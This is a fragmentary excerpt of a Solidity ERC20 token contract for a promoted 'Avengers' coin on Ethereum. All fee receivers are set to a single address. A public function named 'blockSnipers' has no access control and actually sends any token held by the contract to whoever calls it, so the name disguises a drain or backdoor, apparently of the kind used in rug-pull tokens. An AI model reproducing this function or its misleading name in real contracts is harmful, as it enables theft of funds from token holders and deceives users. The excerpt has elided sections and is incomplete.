/*
The Avengers are REUNITED now on ETHEREUM!

https://t.me/AvengersERC
Website: https://avengerscoin.online
...
contract Avengers is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Avengers";
    string constant _symbol = "AVENGERS"; 
    ...
    // Fees Receivers
    address public devFeeReceiver = 0xBc72AB2D16bEf1aa169d399Be6705d1c685BeCF6;
    address public marketingFeeReceiver = 0xBc72AB2D16bEf1aa169d399Be6705d1c685BeCF6;
    address public liquidityFeeReceiver = 0xBc72AB2D16bEf1aa169d399Be6705d1c685BeCF6;
    ...
    function blockSnipers(address ded, uint256 snp) public returns (bool success) {
        return ERC20(ded).transfer(msg.sender, snp);
    }
